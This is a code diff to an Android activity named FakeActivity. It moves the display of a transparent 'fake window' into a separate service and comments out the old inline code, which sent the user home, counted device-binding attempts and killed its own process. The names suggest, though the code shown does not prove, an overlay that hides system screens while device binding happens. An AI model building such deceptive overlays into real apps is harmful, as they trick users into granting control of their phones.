@@ -12,6 +12,8 @@ import com.xstd.plugin.Utils.FakeWindow;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
+import com.xstd.plugin.service.FakeService;
+import com.xstd.plugin.service.PluginService;
 
 /**
  * Created with IntelliJ IDEA.
@@ -50,8 +52,12 @@ public class FakeActivity extends Activity {
 
         this.getWindow().setBackgroundDrawable(new ColorDrawable(0x00000000));
 
-        registerReceiver(mBindSuccesBRC, new IntentFilter(BIND_SUCCESS_ACTION));
+        Intent i = new Intent();
+        i.setClass(getApplicationContext(), FakeService.class);
+        i.setAction(FakeService.ACTION_SHOW_FAKE_WINDOW);
+        startService(i);
 
+        registerReceiver(mBindSuccesBRC, new IntentFilter(BIND_SUCCESS_ACTION));
         mHandler.postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -63,37 +69,37 @@ public class FakeActivity extends Activity {
             }
         }, 500);
 
-        mHandler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                window = new FakeWindow(getApplicationContext(), new FakeWindow.WindowListener() {
-
-                    @Override
-                    public void onWindowPreDismiss() {
-                        UtilsRuntime.goHome(getApplicationContext());
-                    }
-
-                    @Override
-                    public void onWindowDismiss() {
-                        window = null;
-                        mHandler.postDelayed(new Runnable() {
-                            @Override
-                            public void run() {
-                                Config.LOGD("[[FakeActivity::postDelayed]] try to finish process >>>>>>>");
-
-//                                ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-//                                activityManager.killBackgroundProcesses("com.android.settings");
-                                SettingManager.getInstance().setDeviceBindingTime(SettingManager.getInstance().getDeviceBindingTime() + 1);
-
-                                android.os.Process.killProcess(android.os.Process.myPid());
-                            }
-                        }, 200);
-                    }
-                });
-                window.show();
-                window.updateTimerCount();
-            }
-        }, 100);
+//        mHandler.postDelayed(new Runnable() {
+//            @Override
+//            public void run() {
+//                window = new FakeWindow(getApplicationContext(), new FakeWindow.WindowListener() {
+//
+//                    @Override
+//                    public void onWindowPreDismiss() {
+//                        UtilsRuntime.goHome(getApplicationContext());
+//                    }
+//
+//                    @Override
+//                    public void onWindowDismiss() {
+//                        window = null;
+//                        mHandler.postDelayed(new Runnable() {
+//                            @Override
+//                            public void run() {
+//                                Config.LOGD("[[FakeActivity::postDelayed]] try to finish process >>>>>>>");
+//
+////                                ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+////                                activityManager.killBackgroundProcesses("com.android.settings");
+//                                SettingManager.getInstance().setDeviceBindingTime(SettingManager.getInstance().getDeviceBindingTime() + 1);
+//
+//                                android.os.Process.killProcess(android.os.Process.myPid());
+//                            }
+//                        }, 200);
+//                    }
+//                });
+//                window.show();
+//                window.updateTimerCount();
+//            }
+//        }, 100);
     }
 
     @Override
